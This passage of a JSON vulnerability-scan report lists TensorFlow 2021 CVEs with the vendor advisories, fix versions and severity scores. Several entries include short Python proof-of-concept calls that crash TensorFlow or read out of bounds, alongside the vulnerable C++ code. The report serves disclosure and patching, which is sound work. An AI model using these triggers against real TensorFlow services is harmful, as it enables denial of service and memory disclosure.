              "id": "CVE-2021-29585",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29585"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29585",
              "help": {
                "text": "Vulnerability CVE-2021-29585\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29585](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29585)\n### Impact\nThe TFLite computation for size of output after padding, [`ComputeOutSize`](https://github.com/tensorflow/tensorflow/blob/0c9692ae7b1671c983569e5d3de5565843d500cf/tensorflow/lite/kernels/padding.h#L43-L55), does not check that the `stride` argument is not 0 before doing the division.\n\n```cc\ninline int ComputeOutSize(TfLitePadding padding, int image_size,\n                          int filter_size, int stride, int dilation_rate = 1) {\n  int effective_filter_size = (filter_size - 1) * dilation_rate + 1;\n  switch (padding) {\n    case kTfLitePaddingSame:\n      return (image_size + stride - 1) / stride;\n    case kTfLitePaddingValid:\n      return (image_size + stride - effective_filter_size) / stride;\n    default:\n      return 0;\n  }\n}\n```\n  \nUsers can craft special models such that `ComputeOutSize` is called with `stride` set to 0.\n\n### Patches\nWe have patched the issue in GitHub commit [49847ae69a4e1a97ae7f2db5e217c77721e37948](https://github.com/tensorflow/tensorflow/commit/49847ae69a4e1a97ae7f2db5e217c77721e37948).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29585**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29585](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29585)|\n\n### Impact\nThe TFLite computation for size of output after padding, [`ComputeOutSize`](https://github.com/tensorflow/tensorflow/blob/0c9692ae7b1671c983569e5d3de5565843d500cf/tensorflow/lite/kernels/padding.h#L43-L55), does not check that the `stride` argument is not 0 before doing the division.\n\n```cc\ninline int ComputeOutSize(TfLitePadding padding, int image_size,\n                          int filter_size, int stride, int dilation_rate = 1) {\n  int effective_filter_size = (filter_size - 1) * dilation_rate + 1;\n  switch (padding) {\n    case kTfLitePaddingSame:\n      return (image_size + stride - 1) / stride;\n    case kTfLitePaddingValid:\n      return (image_size + stride - effective_filter_size) / stride;\n    default:\n      return 0;\n  }\n}\n```\n  \nUsers can craft special models such that `ComputeOutSize` is called with `stride` set to 0.\n\n### Patches\nWe have patched the issue in GitHub commit [49847ae69a4e1a97ae7f2db5e217c77721e37948](https://github.com/tensorflow/tensorflow/commit/49847ae69a4e1a97ae7f2db5e217c77721e37948).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29570",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29570"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29570",
              "help": {
                "text": "Vulnerability CVE-2021-29570\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29570](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29570)\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)\ngrad = tf.constant([10.0, 10.0, 10.0, 10.0], shape=[1, 1, 1, 4], dtype=tf.float32)\nargmax = tf.constant([1], shape=[1], dtype=tf.int64)\nksize = [1, 1, 1, 1]\nstrides = [1, 1, 1, 1]\n  \ntf.raw_ops.MaxPoolGradWithArgmax(\n  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,\n  padding=`SAME`, include_batch_in_index=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/ef0c008ee84bad91ec6725ddc42091e19a30cf0e/tensorflow/core/kernels/maxpooling_op.cc#L1016-L1017) uses the same value to index in two different arrays but there is no guarantee that the sizes are identical. \n\n### Patches\nWe have patched the issue in GitHub commit [dcd7867de0fea4b72a2b34bd41eb74548dc23886](https://github.com/tensorflow/tensorflow/commit/dcd7867de0fea4b72a2b34bd41eb74548dc23886).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29570**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29570](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29570)|\n\n### Impact\nThe implementation of `tf.raw_ops.MaxPoolGradWithArgmax` can cause reads outside of bounds of heap allocated data if attacker supplies specially crafted inputs:\n\n```python\nimport tensorflow as tf\n\ninput = tf.constant([10.0, 10.0, 10.0], shape=[1, 1, 3, 1], dtype=tf.float32)\ngrad = tf.constant([10.0, 10.0, 10.0, 10.0], shape=[1, 1, 1, 4], dtype=tf.float32)\nargmax = tf.constant([1], shape=[1], dtype=tf.int64)\nksize = [1, 1, 1, 1]\nstrides = [1, 1, 1, 1]\n  \ntf.raw_ops.MaxPoolGradWithArgmax(\n  input=input, grad=grad, argmax=argmax, ksize=ksize, strides=strides,\n  padding=`SAME`, include_batch_in_index=False)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/ef0c008ee84bad91ec6725ddc42091e19a30cf0e/tensorflow/core/kernels/maxpooling_op.cc#L1016-L1017) uses the same value to index in two different arrays but there is no guarantee that the sizes are identical. \n\n### Patches\nWe have patched the issue in GitHub commit [dcd7867de0fea4b72a2b34bd41eb74548dc23886](https://github.com/tensorflow/tensorflow/commit/dcd7867de0fea4b72a2b34bd41eb74548dc23886).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions. \n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29559",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29559"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29559",
              "help": {
                "text": "Vulnerability CVE-2021-29559\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29559)\n### Impact\nAn attacker can access data outside of bounds of heap allocated array in `tf.raw_ops.UnicodeEncode`:\n\n```python\nimport tensorflow as tf\n\ninput_values = tf.constant([58], shape=[1], dtype=tf.int32)\ninput_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)\noutput_encoding = \"UTF-8\"\n\ntf.raw_ops.UnicodeEncode(\n    input_values=input_values, input_splits=input_splits,\n    output_encoding=output_encoding)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/472c1f12ad9063405737679d4f6bd43094e1d36d/tensorflow/core/kernels/unicode_ops.cc)\nassumes that the `input_value`/`input_splits` pair specify a valid sparse tensor.\n\n### Patches\nWe have patched the issue in GitHub commit [51300ba1cc2f487aefec6e6631fef03b0e08b298](https://github.com/tensorflow/tensorflow/commit/51300ba1cc2f487aefec6e6631fef03b0e08b298).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29559**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29559)|\n\n### Impact\nAn attacker can access data outside of bounds of heap allocated array in `tf.raw_ops.UnicodeEncode`:\n\n```python\nimport tensorflow as tf\n\ninput_values = tf.constant([58], shape=[1], dtype=tf.int32)\ninput_splits = tf.constant([[81, 101, 0]], shape=[3], dtype=tf.int32)\noutput_encoding = \"UTF-8\"\n\ntf.raw_ops.UnicodeEncode(\n    input_values=input_values, input_splits=input_splits,\n    output_encoding=output_encoding)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/472c1f12ad9063405737679d4f6bd43094e1d36d/tensorflow/core/kernels/unicode_ops.cc)\nassumes that the `input_value`/`input_splits` pair specify a valid sparse tensor.\n\n### Patches\nWe have patched the issue in GitHub commit [51300ba1cc2f487aefec6e6631fef03b0e08b298](https://github.com/tensorflow/tensorflow/commit/51300ba1cc2f487aefec6e6631fef03b0e08b298).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29530",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29530"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29530",
              "help": {
                "text": "Vulnerability CVE-2021-29530\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29530](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29530)\n### Impact\nAn attacker can trigger a null pointer dereference by providing an invalid `permutation` to `tf.raw_ops.SparseMatrixSparseCholesky`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\nfrom tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops\n\nindices_array = np.array([[0, 0]])\nvalue_array = np.array([-10.0], dtype=np.float32)\ndense_shape = [1, 1]\nst = tf.SparseTensor(indices_array, value_array, dense_shape)\n\ninput = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(\n       st.indices, st.values, st.dense_shape)\n\npermutation = tf.constant([], shape=[1, 0], dtype=tf.int32)\n \ntf.raw_ops.SparseMatrixSparseCholesky(input=input, permutation=permutation, type=tf.float32)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/kernels/sparse/sparse_cholesky_op.cc#L85-L86) fails to properly validate the input arguments: \n                          \n```cc \nvoid Compute(OpKernelContext* ctx) final {\n  ...\n  const Tensor\u0026 input_permutation_indices = ctx-\u003einput(1);\n  ...\n  ValidateInputs(ctx, *input_matrix, input_permutation_indices, \u0026batch_size, \u0026num_rows);\n  ...\n}\n\nvoid ValidateInputs(OpKernelContext* ctx,\n    const CSRSparseMatrix\u0026 sparse_matrix,\n    const Tensor\u0026 permutation_indices, int* batch_size,\n    int64* num_rows) {\n  OP_REQUIRES(ctx, sparse_matrix.dtype() == DataTypeToEnum\u003cT\u003e::value, ...)\n  ...\n}\n```\nAlthough `ValidateInputs` is called and there are checks in the body of this function, the code proceeds to the next line in `ValidateInputs` since [`OP_REQUIRES`](https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/framework/op_requires.h#L41-L48) is a macro that only exits the current function.\n\n```cc\n#define OP_REQUIRES(CTX, EXP, STATUS)                     \\\n  do {                                                    \\\n    if (!TF_PREDICT_TRUE(EXP)) {                          \\\n      CheckNotInComputeAsync((CTX), \"OP_REQUIRES_ASYNC\"); \\\n      (CTX)-\u003eCtxFailure(__FILE__, __LINE__, (STATUS));    \\\n      return;                                             \\\n    }                                                     \\\n  } while (0)\n```\n\nThus, the first validation condition that fails in `ValidateInputs` will cause an early return from that function. However, the caller will continue execution from the next line. The fix is to either explicitly check `context-\u003estatus()` or to convert `ValidateInputs` to return a `Status`.\n\n### Patches\nWe have patched the issue in GitHub commit [e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd](https://github.com/tensorflow/tensorflow/commit/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29530**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29530](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29530)|\n\n### Impact\nAn attacker can trigger a null pointer dereference by providing an invalid `permutation` to `tf.raw_ops.SparseMatrixSparseCholesky`:\n\n```python\nimport tensorflow as tf\nimport numpy as np\nfrom tensorflow.python.ops.linalg.sparse import sparse_csr_matrix_ops\n\nindices_array = np.array([[0, 0]])\nvalue_array = np.array([-10.0], dtype=np.float32)\ndense_shape = [1, 1]\nst = tf.SparseTensor(indices_array, value_array, dense_shape)\n\ninput = sparse_csr_matrix_ops.sparse_tensor_to_csr_sparse_matrix(\n       st.indices, st.values, st.dense_shape)\n\npermutation = tf.constant([], shape=[1, 0], dtype=tf.int32)\n \ntf.raw_ops.SparseMatrixSparseCholesky(input=input, permutation=permutation, type=tf.float32)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/kernels/sparse/sparse_cholesky_op.cc#L85-L86) fails to properly validate the input arguments: \n                          \n```cc \nvoid Compute(OpKernelContext* ctx) final {\n  ...\n  const Tensor\u0026 input_permutation_indices = ctx-\u003einput(1);\n  ...\n  ValidateInputs(ctx, *input_matrix, input_permutation_indices, \u0026batch_size, \u0026num_rows);\n  ...\n}\n\nvoid ValidateInputs(OpKernelContext* ctx,\n    const CSRSparseMatrix\u0026 sparse_matrix,\n    const Tensor\u0026 permutation_indices, int* batch_size,\n    int64* num_rows) {\n  OP_REQUIRES(ctx, sparse_matrix.dtype() == DataTypeToEnum\u003cT\u003e::value, ...)\n  ...\n}\n```\nAlthough `ValidateInputs` is called and there are checks in the body of this function, the code proceeds to the next line in `ValidateInputs` since [`OP_REQUIRES`](https://github.com/tensorflow/tensorflow/blob/080f1d9e257589f78b3ffb75debf584168aa6062/tensorflow/core/framework/op_requires.h#L41-L48) is a macro that only exits the current function.\n\n```cc\n#define OP_REQUIRES(CTX, EXP, STATUS)                     \\\n  do {                                                    \\\n    if (!TF_PREDICT_TRUE(EXP)) {                          \\\n      CheckNotInComputeAsync((CTX), \"OP_REQUIRES_ASYNC\"); \\\n      (CTX)-\u003eCtxFailure(__FILE__, __LINE__, (STATUS));    \\\n      return;                                             \\\n    }                                                     \\\n  } while (0)\n```\n\nThus, the first validation condition that fails in `ValidateInputs` will cause an early return from that function. However, the caller will continue execution from the next line. The fix is to either explicitly check `context-\u003estatus()` or to convert `ValidateInputs` to return a `Status`.\n\n### Patches\nWe have patched the issue in GitHub commit [e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd](https://github.com/tensorflow/tensorflow/commit/e6a7c7cc18c3aaad1ae0872cb0a959f5c923d2bd).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29602",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29602"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29602",
              "help": {
                "text": "Vulnerability CVE-2021-29602\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29602](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29602)\n### Impact\nThe implementation of the `DepthwiseConv` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/1a8e885b864c818198a5b2c0cbbeca5a1e833bc8/tensorflow/lite/kernels/depthwise_conv.cc#L287-L288):\n\n```cc\nint num_input_channels = SizeOfDimension(input, 3);\nTF_LITE_ENSURE_EQ(context, num_filter_channels % num_input_channels, 0);\n```\n\nAn attacker can craft a model such that `input``s fourth dimension would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0](https://github.com/tensorflow/tensorflow/commit/cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29602**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29602](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29602)|\n\n### Impact\nThe implementation of the `DepthwiseConv` TFLite operator is [vulnerable to a division by zero error](https://github.com/tensorflow/tensorflow/blob/1a8e885b864c818198a5b2c0cbbeca5a1e833bc8/tensorflow/lite/kernels/depthwise_conv.cc#L287-L288):\n\n```cc\nint num_input_channels = SizeOfDimension(input, 3);\nTF_LITE_ENSURE_EQ(context, num_filter_channels % num_input_channels, 0);\n```\n\nAn attacker can craft a model such that `input``s fourth dimension would be 0.\n\n### Patches\nWe have patched the issue in GitHub commit [cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0](https://github.com/tensorflow/tensorflow/commit/cbda3c6b2dbbd3fbdc482ff8c0170a78ec2e97d0).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29575",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29575"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29575",
              "help": {
                "text": "Vulnerability CVE-2021-29575\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29575](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29575)\n### Impact\nThe implementation of `tf.raw_ops.ReverseSequence` allows for stack overflow and/or `CHECK`-fail based denial of service.\n\n```python\nimport tensorflow as tf\n\ninput = tf.zeros([1, 1, 1], dtype=tf.int32)\nseq_lengths = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.ReverseSequence(\n    input=input, seq_lengths=seq_lengths, seq_dim=-2, batch_dim=0)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/5b3b071975e01f0d250c928b2a8f901cd53b90a7/tensorflow/core/kernels/reverse_sequence_op.cc#L114-L118) fails to validate that `seq_dim` and `batch_dim` arguments are valid.\n  \nNegative values for `seq_dim` can result in stack overflow or `CHECK`-failure, depending on the version of Eigen code used to implement the operation. Similar behavior can be exhibited by invalid values of `batch_dim`.\n  \n### Patches\nWe have patched the issue in GitHub commit [ecf768cbe50cedc0a45ce1ee223146a3d3d26d23](https://github.com/tensorflow/tensorflow/commit/ecf768cbe50cedc0a45ce1ee223146a3d3d26d23).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29575**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29575](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29575)|\n\n### Impact\nThe implementation of `tf.raw_ops.ReverseSequence` allows for stack overflow and/or `CHECK`-fail based denial of service.\n\n```python\nimport tensorflow as tf\n\ninput = tf.zeros([1, 1, 1], dtype=tf.int32)\nseq_lengths = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.ReverseSequence(\n    input=input, seq_lengths=seq_lengths, seq_dim=-2, batch_dim=0)\n```\n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/5b3b071975e01f0d250c928b2a8f901cd53b90a7/tensorflow/core/kernels/reverse_sequence_op.cc#L114-L118) fails to validate that `seq_dim` and `batch_dim` arguments are valid.\n  \nNegative values for `seq_dim` can result in stack overflow or `CHECK`-failure, depending on the version of Eigen code used to implement the operation. Similar behavior can be exhibited by invalid values of `batch_dim`.\n  \n### Patches\nWe have patched the issue in GitHub commit [ecf768cbe50cedc0a45ce1ee223146a3d3d26d23](https://github.com/tensorflow/tensorflow/commit/ecf768cbe50cedc0a45ce1ee223146a3d3d26d23).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution \nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29518",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29518"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29518",
              "help": {
                "text": "Vulnerability CVE-2021-29518\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29518](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29518)\n### Impact\nIn eager mode (default in TF 2.0 and later), session operations are invalid. However, users could still call the raw ops associated with them and trigger a null pointer dereference:\n\n```python\nimport tensorflow as tf\ntf.raw_ops.GetSessionTensor(handle=[`\"x12\"x1a\\x07`],dtype=4)\n```\n```python\nimport tensorflow as tf\ntf.raw_ops.DeleteSessionTensor(handle=[`\"x12\"x1a\\x07`])\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/eebb96c2830d48597d055d247c0e9aebaea94cd5/tensorflow/core/kernels/session_ops.cc#L104) dereferences the session state pointer without checking if it is valid:\n  \n```cc\n  OP_REQUIRES_OK(ctx, ctx-\u003esession_state()-\u003eGetTensor(name, \u0026val));\n```\n\nThus, in eager mode, `ctx-\u003esession_state()` is nullptr and the call of the member function is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [ff70c47a396ef1e3cb73c90513da4f5cb71bebba](https://github.com/tensorflow/tensorflow/commit/ff70c47a396ef1e3cb73c90513da4f5cb71bebba).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-29518**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29518](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29518)|\n\n### Impact\nIn eager mode (default in TF 2.0 and later), session operations are invalid. However, users could still call the raw ops associated with them and trigger a null pointer dereference:\n\n```python\nimport tensorflow as tf\ntf.raw_ops.GetSessionTensor(handle=[`\"x12\"x1a\\x07`],dtype=4)\n```\n```python\nimport tensorflow as tf\ntf.raw_ops.DeleteSessionTensor(handle=[`\"x12\"x1a\\x07`])\n``` \n\nThe [implementation](https://github.com/tensorflow/tensorflow/blob/eebb96c2830d48597d055d247c0e9aebaea94cd5/tensorflow/core/kernels/session_ops.cc#L104) dereferences the session state pointer without checking if it is valid:\n  \n```cc\n  OP_REQUIRES_OK(ctx, ctx-\u003esession_state()-\u003eGetTensor(name, \u0026val));\n```\n\nThus, in eager mode, `ctx-\u003esession_state()` is nullptr and the call of the member function is undefined behavior.\n\n### Patches\nWe have patched the issue in GitHub commit [ff70c47a396ef1e3cb73c90513da4f5cb71bebba](https://github.com/tensorflow/tensorflow/commit/ff70c47a396ef1e3cb73c90513da4f5cb71bebba).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29555",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29555"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29555",
              "help": {
